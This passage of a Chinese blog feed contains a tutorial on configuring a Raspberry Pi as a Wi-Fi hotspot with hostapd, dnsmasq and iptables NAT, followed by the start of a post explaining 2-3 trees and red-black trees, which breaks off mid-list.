<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">pi@raspberrypi:~ $ uname -a<br>Linux raspberrypi 4.9.80-v7+ <span class="hljs-comment">#1098 SMP Fri Mar 9 19:11:42 GMT 2018 armv7l GNU/Linux</span><br>pi@raspberrypi:~ $ ifconfig <br>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 192.168.2.110  netmask 255.255.255.0  broadcast 192.168.2.255<br>        inet6 fe80::ba27:ebff:fe51:c2cd  prefixlen 64  scopeid 0x20&lt;link&gt;<br>        ether b8:27:eb:51:c2:<span class="hljs-built_in">cd</span>  txqueuelen 1000  (Ethernet)<br>        RX packets 286  bytes 19770 (19.3 KiB)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 257  bytes 33091 (32.3 KiB)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br><br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;<br>        loop  txqueuelen 1  (Local Loopback)<br>        RX packets 6  bytes 522 (522.0 B)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 6  bytes 522 (522.0 B)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br><br>wlan0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500<br>        inet 192.168.3.1  netmask 255.255.255.0  broadcast 192.168.3.255<br>        ether b8:27:eb:04:97:98  txqueuelen 1000  (Ethernet)<br>        RX packets 0  bytes 0 (0.0 B)<br>        RX errors 0  dropped 0  overruns 0  frame 0<br>        TX packets 0  bytes 0 (0.0 B)<br>        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0<br><br>pi@raspberrypi:~ $ iwconfig <br>wlan1     IEEE 802.11  ESSID:off/any  <br>          Mode:Managed  Access Point: Not-Associated   Tx-Power=0 dBm   <br>          Retry short <span class="hljs-built_in">limit</span>:7   RTS thr:off   Fragment thr:off<br>          Power Management:on<br>          <br>lo        no wireless extensions.<br><br>wlan0     IEEE 802.11  ESSID:off/any  <br>          Mode:Managed  Access Point: Not-Associated   Tx-Power=31 dBm   <br>          Retry short <span class="hljs-built_in">limit</span>:7   RTS thr:off   Fragment thr:off<br>          Power Management:on<br>          <br>eth0      no wireless extensions.<br><br>pi@raspberrypi:~ $ lsusb <br>Bus 001 Device 005: ID 0c45:800a Microdia Vivitar Vivicam3350B<br>Bus 001 Device 004: ID 148f:760b Ralink Technology, Corp. MT7601U Wireless Adapter<br>Bus 001 Device 003: ID 0424:ec00 Standard Microsystems Corp. SMSC9512/9514 Fast Ethernet Adapter<br>Bus 001 Device 002: ID 0424:9514 Standard Microsystems Corp. SMC9514 Hub<br>Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub<br></code></pre></div></td></tr></table></figure>
<h3 id="配置无线网卡"><a class="markdownIt-Anchor" href="#配置无线网卡"></a> 配置无线网卡</h3>
<p>这一步骤是修改树莓派的IP地址为路由器地址</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">$ nano /etc/network/interfaces<br>auto lo<br>iface lo inet loopback<br><br>auto eth0<br>iface eth0 inet static<br>address 192.168.2.110<br>netmask	255.255.255.0<br>gateway	192.168.2.1<br><br><span class="hljs-comment">#这里的IP地址其实相当于 &quot;路由器&quot; ip地址</span><br>allow-hotplug wlan0<br>iface wlan0 inet static<br>address 192.168.3.1<br>netmask 255.255.255.0<br></code></pre></div></td></tr></table></figure>
<h3 id="配置hostapd"><a class="markdownIt-Anchor" href="#配置hostapd"></a> 配置hostapd</h3>
<p>hostapd能够“模拟”出一个AP，作为一个认证服务器，并对连接的设备控制管理。<br />
简单说hostapd能够让我们设置WiFi的名称，密码和加密方式等等</p>
<blockquote>
<p>hostapd is a user space daemon for <strong>access point</strong> and <strong>authentication servers</strong>. It implements IEEE 802.11 access point management, IEEE 802.1X/WPA/WPA2/EAP Authenticators, RADIUS client, EAP server, and RADIUS authentication server. The current version supports Linux (Host AP, madwifi, mac80211-based drivers) and FreeBSD (net80211).</p>
</blockquote>
<p>安装 hostapd</p>
<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">sudo apt-<span class="hljs-builtin-name">get</span> install hostapd<br></code></pre></div></td></tr></table></figure>
<p>新建文件 <strong>/etc/hostapd/hostapd.conf</strong> ，并添加如下内容</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">无线网卡接口</span><br>interface=wlan0<br><span class="hljs-meta">#</span><span class="bash">驱动程序</span><br>driver=nl80211<br>hw_mode=g<br>ssid=WIFI-001<br><span class="hljs-meta">#</span><span class="bash">通道</span><br>channel=6<br><span class="hljs-meta">#</span><span class="bash">加密模式 WPA2</span><br>wpa=2<br>wpa_passphrase=12345678<br>wpa_key_mgmt=WPA-PSK<br>wpa_pairwise=CCMP<br>rsn_pairwise=CCMP<br>auth_algs=3<br>wmm_enabled=1<br><span class="hljs-meta">#</span><span class="bash"> 连接ap的最大数量</span><br>max_num_sta=10<br>logger_stdout=-1<br>logger_stdout_level=2<br></code></pre></div></td></tr></table></figure>
<p>其中 <strong>ssid</strong> 和 <strong>wpa_passphrase</strong> 分别为WiFi热点的名称和密码。</p>
<p>接着，还需修改 <strong>/etc/default/hostapd</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> Defaults <span class="hljs-keyword">for</span> hostapd initscript</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># See /usr/share/doc/hostapd/README.Debian for information about alternative</span></span><br><span class="hljs-meta">#</span><span class="bash"> methods of managing hostapd.</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># Uncomment and set DAEMON_CONF to the absolute path of a hostapd configuration</span></span><br><span class="hljs-meta">#</span><span class="bash"> file and hostapd will be started during system boot. An example configuration</span><br><span class="hljs-meta">#</span><span class="bash"> file can be found at /usr/share/doc/hostapd/examples/hostapd.conf.gz</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash">DAEMON_CONF=<span class="hljs-string">&quot;/etc/hostapd/hostapd.conf&quot;</span></span><br><span class="hljs-meta">#</span><span class="bash"> Additional daemon options to be appended to hostapd <span class="hljs-built_in">command</span>:-</span><br><span class="hljs-meta">#</span><span class="bash"> 	-d   show more debug messages (-dd <span class="hljs-keyword">for</span> even more)</span><br><span class="hljs-meta">#</span><span class="bash"> 	-K   include key data <span class="hljs-keyword">in</span> debug messages</span><br><span class="hljs-meta">#</span><span class="bash"> 	-t   include timestamps <span class="hljs-keyword">in</span> some debug messages</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># Note that -B (daemon mode) and -P (pidfile) options are automatically</span></span><br><span class="hljs-meta">#</span><span class="bash"> configured by the init.d script and must not be added to DAEMON_OPTS.</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment">#DAEMON_OPTS=&quot;&quot;</span></span><br></code></pre></div></td></tr></table></figure>
<p>取消 <strong>DAEMON_CONF=&quot;/etc/hostapd/hostapd.conf&quot;</strong> 注释，并添加 hostapd.conf 的路径。这是hostapd守护进程默认要加载的配置文件，这样树莓派每次重启都会加载这个配置文件</p>
<h4 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h4>
<p>当然，我们可以在此之前临时测试配置文件是否生效</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo hostapd /etc/hostapd/hostapd.conf</span><br>Configuration file: /etc/hostapd/hostapd.conf<br>Failed to create interface mon.wlan0: -95 (Operation not supported)<br>wlan0: Could not connect to kernel driver<br>Using interface wlan0 with hwaddr b8:27:eb:04:97:98 and ssid &quot;Wifi&quot;<br>wlan0: interface state UNINITIALIZED-&gt;ENABLED<br>wlan0: AP-ENABLED<br></code></pre></div></td></tr></table></figure>
<p>看到</p>
<blockquote>
<p>wlan0: interface state UNINITIALIZED-&gt;ENABLED<br />
wlan0: AP-ENABLED</p>
</blockquote>
<p>就表示成功创建了一个AP，但无法连接到网络。</p>
<h3 id="配置-dnsmasq"><a class="markdownIt-Anchor" href="#配置-dnsmasq"></a> 配置 dnsmasq</h3>
<blockquote>
<p><a href="http://www.thekelleys.org.uk/dnsmasq/doc.html">Dnsmasq</a> 提供 DNS 缓存和 DHCP 服务功能。作为域名解析服务器(DNS)，dnsmasq可以通过缓存 DNS 请求来提高对访问过的网址的连接速度。作为DHCP 服务器，<a href="https://www.archlinux.org/packages/?name=dnsmasq">dnsmasq</a> 可以用于为局域网电脑分配内网ip地址和提供路由。DNS和DHCP两个功能可以同时或分别单独实现。dnsmasq轻量且易配置，适用于个人用户或少于50台主机的网络。</p>
</blockquote>
<p>也就是说，利用dnsmasq的DNS缓存功能能够让连接AP的设备请求缓存下来，这样下次再连接就无法再需要输入密码，当然这只是暂时的。而通过DHCP就可以动态的为已经连接的设备分配网ip地址等信息。</p>
<p>安装 dnsmasq</p>
<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">$ sudo apt-<span class="hljs-builtin-name">get</span> install dnsmasq<br></code></pre></div></td></tr></table></figure>
<p>编辑 <strong>/etc/dnsmasq.conf</strong>，其中大部分都是注释。<br />
在最后添加如下内容</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">interface=wlan0<br>listen-address=127.0.0.1,192.168.3.1<br>dhcp-range=192.168.3.50,192.168.3.150,12h<br><span class="hljs-meta">#</span><span class="bash"> DNS</span><br>resolv-file=/etc/resolv.conf<br></code></pre></div></td></tr></table></figure>
<p><strong>dhcp-range</strong> 表示要动态分配给连接设备IP地址在所属IP网段范围之内，这里为50~150</p>
<p><strong>/etc/resolv.conf</strong> 配置如下</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nameserver 8.8.8.8<br></code></pre></div></td></tr></table></figure>
<h3 id="开启ip转发功能"><a class="markdownIt-Anchor" href="#开启ip转发功能"></a> 开启IP转发功能</h3>
<p>注意，这一步是必须的，不然就算设备连接成功WiFi，那也无法连接到网络！！！</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">1. sudo sh -c &quot;echo 1 &gt; /proc/sys/net/ipv4/ip_forward&quot;<br>2. sudo sysctl net.ipv4.ip_forward=1 <br>sudo sysctl -p /etc/sysctl.conf<br><br>cat /proc/sys/net/ipv4/ip_forward<br></code></pre></div></td></tr></table></figure>
<p>建议修改 <strong>/etc/sysctl.conf</strong> 文件，只需将 <code>#net.ipv4.ip_forward=1</code> 取消注释即可。</p>
<h3 id="iptables防火墙路由转发"><a class="markdownIt-Anchor" href="#iptables防火墙路由转发"></a> iptables防火墙路由转发</h3>
<p>这一步同上一步一样重要，这里主要是设置nat路由转发，不然还是无法上网的</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">pi@raspberrypi:~ $ sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE<br>pi@raspberrypi:~ $ sudo iptables -t nat --line-numbers -L -n<br>Chain PREROUTING (policy ACCEPT)<br>num  target     prot opt <span class="hljs-built_in">source</span>               destination         <br>Chain INPUT (policy ACCEPT)<br>num  target     prot opt <span class="hljs-built_in">source</span>               destination         <br>Chain OUTPUT (policy ACCEPT)<br>num  target     prot opt <span class="hljs-built_in">source</span>               destination         <br>Chain POSTROUTING (policy ACCEPT)<br>num  target     prot opt <span class="hljs-built_in">source</span>               destination         <br>1    MASQUERADE  all  --  0.0.0.0/0            0.0.0.0/0<br></code></pre></div></td></tr></table></figure>
<p>这里的意思是，路由器源地址（<strong>MASQUERADE</strong>自动获取当前树莓派IP地址[ 比如我这里为静态192.168.2.110 ])，并且已接入网络）将数据通过eth0接口转发到已连接的IP地址（0.0.0.0/0）</p>
<p>在这里 -j MASQUERADE 相当于 -j SNAT --to-source 192.168.2.110<br />
这个时候设备既可以连接到互联网了！</p>
<h3 id="开启启动服务"><a class="markdownIt-Anchor" href="#开启启动服务"></a> 开启启动服务</h3>
<p>1.开机自启动服务</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo systemctl <span class="hljs-built_in">enable</span> hostapd<br>sudo systemctl <span class="hljs-built_in">enable</span> dnsmasq<br></code></pre></div></td></tr></table></figure>
<p>2.自动设置iptables</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sudo iptables-save &gt; /home/pi/iptables_forward<br></code></pre></div></td></tr></table></figure>
<p>添加如下内容到 <strong>/etc/rc.local</strong> (exit 0 之前)</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">iptables-restore &lt; /home/pi/iptables_forward<br></code></pre></div></td></tr></table></figure>
<p>注意还要开启了IP转发功能</p>
<p>之后 <code>sudo reboot</code> 重启，等待</p>
<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
<p>如果在 <code>sudo systemctl enable hostapd</code> 时出现一下信息</p>
<blockquote>
<p>Synchronizing state of hostapd.service with SysV service script with /lib/systemd/systemd-sysv-install.<br />
Executing: /lib/systemd/systemd-sysv-install enable hostapd<br />
Failed to enable unit: Unit file /etc/systemd/system/hostapd.service is masked.</p>
</blockquote>
<p>解决方法 <code>sudo systemctl unmask hostapd</code> 后再 <code>sudo systemctl enable hostapd</code></p>
<p>最后的最后补成果图<br />
<img src="/uploads/images/rasppi/file_004.png" alt="img" /></p>
<p><img src="/uploads/images/rasppi/phone.jpg" alt="img" /></p>
<p><img src="/uploads/images/rasppi/file_005.png" alt="img" /></p>
<p>bye~</p>
]]></content>
      <categories>
        <category>RaspberryPi</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>我所理解的红黑树(RBT)</title>
    <url>/rb-tree-cpp/</url>
    <content><![CDATA[<p>红黑树（Red–Black Tree）是一种自平衡二叉查找树，用于实现<strong>关联数组</strong>。它在1972年由鲁道夫·贝尔（Rudolf Bayer）发明，被称为&quot;对称二叉B树&quot;。</p>
<span id="more"></span>
<h3 id="2-3树"><a class="markdownIt-Anchor" href="#2-3树"></a> 2-3树</h3>
<p>由于红黑树过于复杂，因此在讲述之前我们先来大致了解一下<code>2-3树</code>，2-3树类似红黑树，也是平衡树，时间复杂度均为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>。<br />
2–3树早于红黑树出现，由约翰·霍普克洛夫特于1970年发明。2-3树也称为<code>3阶B-树</code>、<code>3叉搜索树</code>。<br />
2-3树中的一个父节点可以有2个子节点也可以有3个子节点。<br />
有2个子节点的父节点称为<code>2-</code>节点，该节点有1个key。这类似二叉树的节点<br />
有3个子节点的父节点称为<code>3-</code>节点，该节点有2个key。假设父节点键为key1和key2且key1 &lt; key2，左子树L、中子树M、右子树R。则左子树L &lt; key1，key1 &lt; 中子树M &lt; key2 ，右子树 &gt; key2。</p>
<p>2-3树是一棵<code>完全3叉搜索树</code>。每个节点要么是<code>叶子节点</code>，要么是<code>2-节点</code>或<code>3-节点</code>，，而且每个节点的子树一定是<code>等高</code>的。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/01.png" alt="" /></p>
<p>如上图，关键字为 <code>[f h]</code> 的<code>3-节点</code>有3个子节点<code>e</code>、<code>g</code>、<code>[i j]</code>，且 <code>e&lt;f</code>、<code>f&lt;g&lt;h</code>、<code>[i j]&gt;h</code></p>
<h4 id="查找"><a class="markdownIt-Anchor" href="#查找"></a> 查找</h4>
<p>2-3树的查找类似bst，比如查找上图的<code>g</code></p>
<ol>
<li>首先g和d比较，g&gt;d，查找右子树</li>
<li>f&lt;g&lt;h，进入中子树</li>
<li>g=g，返回节点，查找结束</li>
</ol>
<h4 id="插入"><a class="markdownIt-Anchor" href="#插入"></a> 插入</h4>
<p>插入操作只需在<code>叶子节点</code>处插入一个新节点，不过由于2-3树的定义需要调整树的结构，使其平衡。<br />
在叶子节点而不是空节点处插入节点的好处是以后维护平衡就简单了，而且树的高度也是尽可能的低。<br />
插入新节点处的叶子节点可为<code>2-节点</code>或<code>3-节点</code><br />
<img src="/uploads/images/data_structure/rbtree_cpp/02.png" alt="" /></p>
<p>如上图就是在2-节点位置<code>i</code>直接插入一个新节点<code>j</code>而变成一个3-节点，这种情况下无需调整树结构就已经平衡。</p>
<p>在3-节点处插入新节点同样也是在叶子节点插入，不过这样会导致形成一个<code>4-节点</code>，在2-3树中这是不允许的，因此需要调整。调整方式为就是将<code>4-节点</code>分裂与合并。</p>
<p><code>节点分裂</code> 是将一个4-节点的中间值key节点提取处来作为父节点，左边key作为左节点，右边key作为右节点。<br />
若该4-节点存在子节点，那么将左边key作为最左边两个子节点父节点，将右边key作为最右边两个子节点父节点。</p>
<p><img src="/uploads/images/data_structure/rbtree_cpp/04.png" alt="" /></p>
<p>节点分裂一般伴随着<code>节点合并</code>，也就是将分裂后的父节点与之前未分裂4-节点的父节点合并成一个新的节点，如果新节点依旧是4-节点，那么继续向上分裂合并直到满足平衡。</p>
<p>举个例子：<br />
向这棵2-3树插入<code>k</code>节点后成为4-节点，不符合定义，需要分裂该节点。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/03.png" alt="" /></p>
<p>将节点<code>[i j k]</code>中的<code>j</code>提取出来与与父节点<code>[f h]</code>合并成<code>[f h j]</code>，发现该节点依然是一个4-节点，因此需要继续分裂+合并。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/05.png" alt="" /></p>
<p>此时<code>[d h]</code>已经是一个3-节点了，而且整个2-3树也是等高的，调整结束。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/06.png" alt="" /></p>
<p>插入<code>a-k</code>的整个过程如下<br />
<img src="/uploads/images/data_structure/rbtree_cpp/07.gif" alt="" /></p>
<h4 id="删除"><a class="markdownIt-Anchor" href="#删除"></a> 删除</h4>
<p>2-3树的删除虽然较为复杂，但大致可分为两类：删除叶子节点和删除非叶子节点。</p>
<h5 id="删除叶子节点"><a class="markdownIt-Anchor" href="#删除叶子节点"></a> 删除叶子节点</h5>
<p>删除叶子节点又可以分为<code>删除2-节点</code>和<code>删除3-节点</code>。<br />
删除3-节点的情况最简单，直接删除即可。如下删除key为k的情况<br />
<img src="/uploads/images/data_structure/rbtree_cpp/08.png" alt="" /></p>
<p>删除2-节点不能简单的删除该节点，因为这样一删除后，该位置为空，2-3树是不允许存在这种情况的。此时可分为如下几类情况来处理：</p>
<ul>
<li>待删除节点的<code>临近兄弟节点</code>是<code>3-节点</code></li>
<li>待删除节点的<code>临近兄弟节点</code>是<code>2-节点</code>，但<code>父节点</code>是<code>3-节点</code></li>
<li>待删除节点的<code>临近兄弟节点</code>和<code>父节点</code>均是<code>2-节点</code></li>
</ul>
<p>对于第一种情况，删除该节点后只需向<code>临近兄弟节点</code>“借”<strong>一个key与待删除节点相近</strong>作为新的节点并<code>调整其与父节点</code>，此时树的高度不变。<br />
如下图，删除<code>i</code>节点，而且兄弟是3-节点，将兄弟节点中key<code>k</code>与删除节点相近的key<code>j</code>而不是<code>l</code>作为已删除节点。由于<code>k&gt;j</code>，因此需要调整父子节点键值<br />
<img src="/uploads/images/data_structure/rbtree_cpp/09.png" alt="" /></p>
<p>对于第二种情况，首先删除该节点后，发现<code>临近兄弟节点g</code>是一个2-节点且父节点<code>[f h]</code>为3-节点。因此将父节点分解为2-节点，由于<code>e&lt;f&lt;g</code>，于是将<code>f</code>与<code>临近兄弟节点g</code>合并成3-节点，并作为一个新的左孩子<br />
<img src="/uploads/images/data_structure/rbtree_cpp/10.png" alt="" /></p>
<p>演示过程如下<br />
<img src="/uploads/images/data_structure/rbtree_cpp/11.gif" alt="" /></p>
<p>第三种情况待删除节点的兄弟节点和父节点均是2-节点，删除节点后将<code>父节点b</code>和<code>兄弟节点c</code>合并成3-节点。<br />
1.若此时<code>兄弟节点f和父节点d又是2-节点</code>，故继续合并d、f直到平衡，最终的结构如下。图中空位置只是直观上表示一棵等高的2-3树且该节点被“删除”了。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/12.png" alt="" /></p>
<p>2.若此时<code>临近兄弟节点是2-节点、父节点是3-节点</code>，则可看作是上述第二种删除情况。<br />
如下，删除<code>2-节点a</code>，此时兄弟节点c和父节点b均为2-节点，因此合并成<code>3-节点[b c]</code>，此时仍然未平衡，且<code>临近兄弟节f点是2-节点、父节点[d h]是3-节点</code>，因此分解父节点<code>[d h]</code>，将<code>d</code>与临近兄弟节<code>f</code>合并为3-节点<code>[d-f]</code><br />
<img src="/uploads/images/data_structure/rbtree_cpp/13.png" alt="" /></p>
<p>演示过程如下<br />
<img src="/uploads/images/data_structure/rbtree_cpp/14.gif" alt="" /></p>
<p>3.若此时<code>临近兄弟节点是3-节点</code>，该过程也可看作是上述第一种删除情况，此处不再叙述。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/15.png" alt="" /></p>
<p>演示过程如下<br />
<img src="/uploads/images/data_structure/rbtree_cpp/16.gif" alt="" /></p>
<h5 id="删除非叶子节点"><a class="markdownIt-Anchor" href="#删除非叶子节点"></a> 删除非叶子节点</h5>
<p>删除非叶子节点首先也需要找到一个<code>前驱/后继节点</code>，有点类似BST。<br />
总之简单来说，前驱节点就是节点的左子树的最右节点，后继节点就是节点的右子树的最左节点。</p>
<p>如下删除<code>key=d</code>的节点，该key位于3-节点，不过没关系。找到其<code>前驱节点c</code>，将键值替换后删除<code>前驱节点c</code>，删除操作就转化为上述3种情况之一。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/17.png" alt="" /></p>
<p>演示过程如下<br />
<img src="/uploads/images/data_structure/rbtree_cpp/18.gif" alt="" /></p>
<p>以上大致是关于2-3树的一些基本操作了。说了这么多，就是为了2-3树和为红黑树之间的转化。<br />
先来看这张图，将2-3树的<code>3-节点</code>拆解成父子节点，且用红色箭头表明两者父子关系，将子节点染成红色，父节点染成黑色；再将其余<code>2-节点</code>全部染成黑色。经过适当调整树结构后发现这是一棵红黑树！实际上，这是红黑树的变体——<code>左偏红黑树</code>。<br />
<img src="/uploads/images/data_structure/rbtree_cpp/19.png" alt="" /></p>
<p>实际上向一棵普通的红黑树插入key为<code>a-l</code>应该是这样的：<br />
<img src="/uploads/images/data_structure/rbtree_cpp/20.png" alt="" /></p>
<p>2-3树一定能转化为红黑树(左偏红黑树)，而红黑树不一定能转化为2-3树！<br />
由于<code>2-3-4树</code>是红黑树的一种等同，故2-3-4树一定能转化为红黑树，而红黑树也一定能转化为2-3-4树！</p>
<h3 id="红黑树"><a class="markdownIt-Anchor" href="#红黑树"></a> 红黑树</h3>
<h4 id="基本概念"><a class="markdownIt-Anchor" href="#基本概念"></a> 基本概念</h4>
<blockquote>
<p>红黑树（英语：Red–black tree）是一种自平衡二叉查找树，是在计算机科学中用到的一种数据结构，典型的用途是实现关联数组。它在1972年由鲁道夫·贝尔发明，被称为&quot;对称二叉B树&quot;，它现代的名字源于Leo J. Guibas和Robert Sedgewick于1978年写的一篇论文。红黑树的结构复杂，但它的操作有着良好的最坏情况运行时间，并且在实践中高效：它可以在 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>log</mi><mo>⁡</mo><mi>N</mi></mrow><annotation encoding="application/x-tex">\log N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span></span></span></span> 时间内完成查找，插入和删除，这里的 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span></span></span></span> 是树中元素的数目。</p>
<p>红黑树相对于AVL树来说，牺牲了部分平衡性以换取插入/删除操作时少量的旋转操作，整体来说性能要优于AVL树。</p>
</blockquote>
<p>根据2-3树转化为红黑树可以这样定义红黑树，或者是<code>规则</code>：</p>
<ul>
<li>红黑树一定是二叉搜索树，因为2-3树也是二叉搜索树；</li>
<li>根节点和所有外部节点(Nil)都是<code>黑色</code>，根据2-3树转化为左偏红黑树可看出来；</li>
<li>在根至外部节点(Nil)路径上，没有连续两个节点是<code>红色</code>的；</li>
